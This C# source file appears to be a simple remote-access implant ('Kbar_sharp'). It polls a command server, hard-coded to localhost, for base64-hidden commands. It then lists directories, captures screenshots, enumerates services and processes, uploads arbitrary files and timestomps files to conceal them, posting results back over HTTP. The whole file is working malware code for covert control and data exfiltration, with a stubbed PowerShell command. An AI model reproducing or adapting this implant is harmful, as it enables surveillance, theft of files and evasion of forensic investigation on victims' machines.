using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Net.Http;
using System.IO;
using System.Drawing;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.ServiceProcess;
using System.Management;
using System.Diagnostics;
using System.ComponentModel;
using System.Net;
using System.Threading;

namespace Kbar_sharp
{
    class Program
    {

        static string Base64Encode(string plain)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plain);
            return System.Convert.ToBase64String(plainTextBytes);
        }

        static void sendData(HttpClient cl, string encodedData)
        {
            byte[] buff = Encoding.UTF8.GetBytes(encodedData);
            var stream = new MemoryStream(buff);
            stream.Position = 0;
            HttpResponseMessage result = new HttpResponseMessage(System.Net.HttpStatusCode.OK);
            result.Content = new StreamContent(stream);
            cl.PostAsync("http://127.0.0.1/data/", result.Content);

        
        }

        

        static void sendPictureData(HttpClient cl, byte[] arr)
        {
            WebRequest request = WebRequest.Create("http://127.0.0.1/data/");
            request.Method = "POST";
            request.ContentType = "image/jpeg";
            request.ContentLength = arr.Length;
            Stream dataStream = request.GetRequestStream();
            dataStream.Write(arr, 0, arr.Length);
            dataStream.Close();
        }

        static void sendBinaryData(HttpClient cl, byte[] arr)
        {
            WebRequest request = WebRequest.Create("http://127.0.0.1/data/");
            request.Method = "POST";
            request.ContentType = "application/octet-stream";
            request.ContentLength = arr.Length;
            Stream dataStream = request.GetRequestStream();
            dataStream.Write(arr, 0, arr.Length);
            dataStream.Close();
        }

        static String getCommand(HttpClient cl)
            {
            String res = "";
            Task<String> results = cl.GetStringAsync("http://127.0.0.1/index/");
            try
            {
                res = results.Result;
            }
            catch(Exception e)
            {
                return "";
            }
            int pFrom = res.LastIndexOf("$");
            int pTo = res.IndexOf("zzz");

            String com = res.Substring(pFrom, pTo - pFrom);
            com = com.Substring(com.IndexOf('=') + 1);

            byte[] data = Convert.FromBase64String(com);
            String decodedData = Encoding.UTF8.GetString(data);

            Regex matchCommand = new Regex("<com>(.*?)</com>");
            var v = matchCommand.Match(decodedData);
            String commandString = v.Groups[1].ToString();
                       

            return commandString;
        }

        static string comDir(String arg)
        {
            if(arg == "")
            {
                arg = Directory.GetCurrentDirectory();
            }
            String[] files = Directory.GetFiles(arg);
            String[] dirs = Directory.GetDirectories(arg);
            string alldata="";

            List<string> fd = new List<string>();
            fd.AddRange(files);
            fd.AddRange(dirs);
            fd.Sort();

            foreach (string i in fd)
            {
                alldata += i + "\n";
            }

            return Base64Encode(alldata);

            
        }

        static string comCd(String arg)
        {
            if (arg == "")
                return Base64Encode("Current Directory is: " + Directory.GetCurrentDirectory());
            Directory.SetCurrentDirectory(arg);
            return Base64Encode("Current Directory is now : " + Directory.GetCurrentDirectory());
        }

        static byte[] comScreenshot()
        {
            Bitmap screenmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics graphics = Graphics.FromImage(screenmap as Image);
            graphics.CopyFromScreen(0, 0, 0, 0, screenmap.Size);
            using (var stream = new MemoryStream())
            {
                screenmap.Save(stream, System.Drawing.Imaging.ImageFormat.Jpeg);
                return stream.ToArray();
            }    
            
        }

        static byte[] comDownload(string arg)
        {
            if (arg.Contains("\""))
                arg = arg.Replace("\"", "");
            return System.IO.File.ReadAllBytes(arg);
        }

        static string timestomp(string arg)
        {
            string timeret = "";
            DateTime[] before = { new DateTime(), new DateTime(), new DateTime() };
            string good = arg.Split(' ')[0];
            string bad = arg.Split(' ')[1];

            timeret += "If the time doesn't change check that the files exist\n";


            try
            {
                before[0] = Directory.GetCreationTime(bad);
                before[1] = Directory.GetLastAccessTime(bad);
                before[2] = Directory.GetLastWriteTime(bad);

                Directory.SetCreationTime(bad, Directory.GetCreationTime(good));
                Directory.SetLastAccessTime(bad, Directory.GetLastAccessTime(good));
                Directory.SetLastWriteTime(bad, Directory.GetLastWriteTime(good));

                timeret += "Creation Time: " + before[0] + " -> " + Directory.GetCreationTime(bad) + "\n";
                timeret += "Last Access Time: " + before[1] + " -> " + Directory.GetLastAccessTime(bad) + "\n";
                timeret += "Last Write Time: " + before[2] + " -> " + Directory.GetLastWriteTime(bad) + "\n";
            }
            catch(Exception e)
            {
                timeret = e.Message;
            }

            return Base64Encode(timeret);
        }

        static string servlist()
        {
            ServiceController[] service;
            service = ServiceController.GetServices();
            ManagementObject wmi;
            string servret = "";

            foreach (ServiceController sc in service)
            {
                servret += "\n";
                servret += "    Service :     {0}" + sc.ServiceName + "\n";
                servret += "    DisplayName:     {0}" + sc.DisplayName + "\n";
                wmi = new ManagementObject("Win32_service.Name='" + sc.ServiceName + "'");
                wmi.Get();
                servret += "    Status:     {0}" + wmi["State"] + "\n";
                servret += "    BinPath:    {0}" + wmi["PathName"] + "\n";
            }

            return Base64Encode(servret);
           
        }

        static string proclist()
        {
            Process[] all = Process.GetProcesses();
            string procret = "";
            foreach(Process process in all)
            {
                procret += "\n";
                procret += "Process Name:     " + process.ProcessName + "\n";
                procret += "PID:     " + process.Id + "\n";
                try
                {
                    procret += "Path:     {0}" + process.MainModule.FileName + "\n";
                }
                catch(Exception e)
                {
                    procret += "Access is denied\n";
                }
            }

            return Base64Encode(procret);
        }

        static void powercom(string args)
        {
            
        }

        public static void executeCommand(String com, HttpClient cl)
        {
            string arg = "";
            string command = "";
            if (com.Contains(' '))
            {
                arg = com.Split(' ')[1];
                command = com.Split(' ')[0];

                if (command == "time")
                    arg = arg + ' ' + com.Split(' ')[2];
            }
            else
                command = com;

            switch(command)
            {
                case "dir":
                    sendData(cl, comDir(arg));
                    break;
                case "cd":
                    sendData(cl, comCd(arg));
                    break;
                case "screen":
                    sendPictureData(cl, comScreenshot());
                    break;
                case "time":
                    sendData(cl, timestomp(arg));
                    break;
                case "servlist":
                    sendData(cl, servlist());
                    break;
                case "proclist":
                    sendData(cl, proclist());
                    break;
                case "get":
                    sendBinaryData(cl, comDownload(arg));
                    break;
                case "powershell":
                    powercom(arg);
                    break;
                default:
                    Console.WriteLine();
                    Console.WriteLine("That didnt match any commands, try: dir, cd, screen, time [good] [bad], servlist, get [path to file] or proclist");
                    break;
            }
            }

        static void Main(string[] args)
        {
            while (true)
            {
                HttpClient client = new HttpClient();



                String c = getCommand(client);
                if (c == "")
                    continue;
                Console.WriteLine(c);
                executeCommand(c, client);
                Thread.Sleep(5000);
            }
        }
    }
}
